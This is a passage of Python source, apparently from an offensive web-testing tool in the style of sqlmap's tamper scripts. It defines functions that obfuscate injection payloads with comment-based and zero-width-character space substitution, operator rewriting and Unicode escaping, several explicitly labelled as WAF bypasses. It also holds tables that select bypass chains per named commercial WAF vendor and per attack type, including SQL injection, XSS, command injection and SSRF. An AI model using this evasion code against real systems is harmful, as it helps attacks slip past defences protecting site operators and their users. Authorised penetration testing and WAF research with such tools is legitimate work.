@TamperRegistry.register("space2wj", "spaces", "Spaces -> word joiner")
def space2wj(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%81%A0" if "%" in payload else "\u2060")

@TamperRegistry.register("space2zwsp2", "spaces", "Spaces -> zero-width space alt")
def space2zwsp2(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%EF%BB%BF" if "%" in payload else "\ufeff")

@TamperRegistry.register("space2og2", "spaces", "Spaces -> OG comment alt")
def space2og2(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/*!50727*/")

@TamperRegistry.register("space2mysqlversioned", "spaces", "Spaces -> MySQL versioned comment")
def space2mysqlversioned(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/*!50000*/")

@TamperRegistry.register("space2mssqlversioned", "spaces", "Spaces -> MSSQL versioned comment")
def space2mssqlversioned(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/**/")

@TamperRegistry.register("space2oracleversioned", "spaces", "Spaces -> Oracle comment")
def space2oracleversioned(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "--%0A" if "%" in payload else "--\n")

@TamperRegistry.register("space2pgversioned", "spaces", "Spaces -> PostgreSQL comment")
def space2pgversioned(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/**/")

@TamperRegistry.register("space2sqliteversioned", "spaces", "Spaces -> SQLite comment")
def space2sqliteversioned(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/**/")

@TamperRegistry.register("space2all", "spaces", "Spaces -> all blank types randomly")
def space2all(payload: str, **kwargs) -> str:
    all_blanks = ['/**/', '%09', '%0A', '%0C', '%0D', '%0B', '%A0', '%00',
                  '/*!*/', '/**_**/', '--%0A', '%23%0A', '.0e0', '()', '``']
    return _replace_spaces(payload, "", all_blanks)

@TamperRegistry.register("between2gtlt", "operators", "BETWEEN -> > and <")
def between2gtlt(payload: str, **kwargs) -> str:
    m = re.search(r"(\w+)\s+BETWEEN\s+(\d+)\s+AND\s+(\d+)", payload, re.IGNORECASE)
    if m:
        return payload.replace(m.group(), f"{m.group(1)}>={m.group(2)} AND {m.group(1)}<={m.group(3)}")
    return payload

@TamperRegistry.register("bluecoat", "waf", "BlueCoat WAF bypass with random whitespace")
def bluecoat(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)UNION\s+SELECT", "UNION%09SELECT", payload.replace(" ", "%09"))

@TamperRegistry.register("xforwardedfor", "headers", "X-Forwarded-For header injection")
def xforwardedfor(payload: str, **kwargs) -> str:
    return payload

@TamperRegistry.register("varnishbypass", "waf", "Varnish WAF bypass")
def varnishbypass(payload: str, **kwargs) -> str:
    return payload

@TamperRegistry.register("elttamper", "mysql", "ORD -> ELT")
def elttamper(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)\bORD\b", "ELT(1,", payload)

@TamperRegistry.register("charunicodeescape", "encoding", "Unicode escape encoding")
def charunicodeescape(payload: str, **kwargs) -> str:
    return "".join(f"\\u00{ord(c):02x}" if c.isalpha() else c for c in payload)

@TamperRegistry.register("nestedcomment", "general", "Nested comment obfuscation")
def nestedcomment(payload: str, **kwargs) -> str:
    return payload.replace(" ", "/**`/**/").replace(" ", "`/**/")


WAF_TAMPER_MAP: Dict[str, List[str]] = {
    "cloudflare": ["space2comment", "randomcase", "versionedkeywords", "cloudflareconcat", "encoding_chain"],
    "modsecurity": ["space2hash", "randomcase", "modsecurityversioned", "charunicodeencode", "nestedcomment"],
    "imperva": ["space2dash", "between", "impervacharencode", "chardoubleencode", "space2randomblank"],
    "incapsula": ["space2dash", "between", "impervacharencode", "chardoubleencode", "space2randomblank"],
    "f5": ["space2tab", "multiplespaces", "greatest", "symboliclogical", "space2mssqlblank"],
    "f5 big-ip asm": ["space2tab", "multiplespaces", "greatest", "symboliclogical", "space2mssqlblank"],
    "akamai": ["space2comment", "equaltolike", "randomcase", "charencode", "space2morecomment"],
    "barracuda": ["space2hash", "between", "lowercase", "base64encode", "space2randomblank"],
    "fortiweb": ["space2dash", "multiplespaces", "randomcase", "space2comment", "space2morehash"],
    "aws waf": ["space2comment", "apostrophemask", "charunicodeencode", "chardoubleencode", "space2mysqlblank"],
    "safedog": ["space2comment", "multiplespaces", "lowercase", "space2randomblank", "versionedmorekeywords"],
    "yundun": ["space2hash", "versionedkeywords", "randomcase", "space2mysqlblank", "chardoubleencode"],
    "chuangyu": ["space2comment", "multiplespaces", "lowercase", "space2randomblank", "space2morecomment"],
    "baidu yunjiasu": ["space2dash", "randomcase", "space2morecomment", "symboliclogical", "space2randomblank"],
    "360 wangzhan weishi": ["space2comment", "randomcase", "space2morehash", "space2randomblank"],
    "sucuri": ["space2comment", "randomcase", "base64encode", "space2mysqlblank"],
    "wordfence": ["space2hash", "randomcase", "space2morecomment", "chardoubleencode"],
    "wallarm": ["space2comment", "multiplespaces", "versionedkeywords", "space2randomblank"],
    "radware": ["space2dash", "randomcase", "space2morecomment", "space2mysqlblank"],
    "denyall": ["space2hash", "between", "lowercase", "space2randomblank"],
    "distil": ["space2comment", "randomcase", "space2morehash", "chardoubleencode"],
    "citrix netscaler": ["space2tab", "multiplespaces", "greatest", "symboliclogical"],
    "generic": ["space2comment", "randomcase", "versionedkeywords", "space2randomblank"],
}

WAF_TAMPER_PRIORITY: Dict[str, List[str]] = {
    "sql_injection": ["space2comment", "randomcase", "versionedkeywords", "space2randomblank",
                      "equaltolike", "between", "greatest", "symboliclogical", "charunicodeencode"],
    "xss": ["space2comment", "randomcase", "htmlencode", "charunicodeencode", "space2hash"],
    "command_injection": ["space2comment", "space2hash", "space2dash", "nullbyte", "space2randomblank"],
    "path_traversal": ["space2comment", "chardoubleencode", "space2hash", "nullbyte"],
    "file_inclusion": ["space2comment", "chardoubleencode", "nullbyte", "space2hash"],
    "ssrf": ["space2comment", "chardoubleencode", "space2hash", "space2randomblank"],
    "xxe": ["space2comment", "charunicodeencode", "htmlencode", "space2hash"],
    "deserialization": ["space2comment", "base64encode", "chardoubleencode", "space2randomblank"],
    "generic": ["space2comment", "randomcase", "versionedkeywords", "space2randomblank"],
}


class IntelligentTamperSelector:
    _instance: Optional["IntelligentTamperSelector"] = None
    _lock = threading.Lock()
    _chain_cache: Dict[str, TamperChain] = {}
    _cache_max = 64

    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._chain_cache = {}
        return cls._instance

    def select(self, waf_name: Optional[str] = None,
               attack_type: Optional[str] = None,
               custom_tampers: Optional[List[str]] = None) -> TamperChain:
        if custom_tampers:
            return TamperChain(custom_tampers)

        cache_key = f"{waf_name or 'none'}:{attack_type or 'generic'}"
        if cache_key in self._chain_cache:
            return self._chain_cache[cache_key]

        selected: List[str] = []

        if waf_name:
            waf_lower = waf_name.lower()
            for waf_key, tampers in WAF_TAMPER_MAP.items():
                if waf_key in waf_lower or waf_lower in waf_key:
                    selected.extend(tampers)
                    break
            else:
                selected.extend(WAF_TAMPER_MAP["generic"])

        if attack_type and attack_type in WAF_TAMPER_PRIORITY:
            priority_tampers = WAF_TAMPER_PRIORITY[attack_type]
            for t in priority_tampers:
                if t not in selected:
                    selected.append(t)

        if not selected:
            selected = WAF_TAMPER_MAP["generic"]

        seen: set = set()
        unique = []
        for t in selected:
            if t not in seen:
                seen.add(t)
                unique.append(t)

        chain = TamperChain(unique)

        if len(self._chain_cache) >= self._cache_max:
            self._chain_cache.clear()
        self._chain_cache[cache_key] = chain

        return chain

    def get_attack_type_for_category(self, category: str) -> str:
        category_lower = category.lower()
        attack_map = {
            "sql": "sql_injection", "sqli": "sql_injection", "sql_injection": "sql_injection",
            "xss": "xss", "cross_site_scripting": "xss",
            "rce": "command_injection", "command_injection": "command_injection",
            "lfi": "file_inclusion", "file_inclusion": "file_inclusion",
            "path_traversal": "path_traversal",
            "ssrf": "ssrf",
            "xxe": "xxe",
            "deserialization": "deserialization",
        }
        for key, atype in attack_map.items():
            if key in category_lower:
                return atype
        return "generic"

    def clear_cache(self):
        with self._lock:
            self._chain_cache.clear()


def get_tamper_chain_for_waf(waf_name: str) -> TamperChain:
    selector = IntelligentTamperSelector()
    return selector.select(waf_name=waf_name)


def get_intelligent_tamper_selector() -> IntelligentTamperSelector:
    return IntelligentTamperSelector()
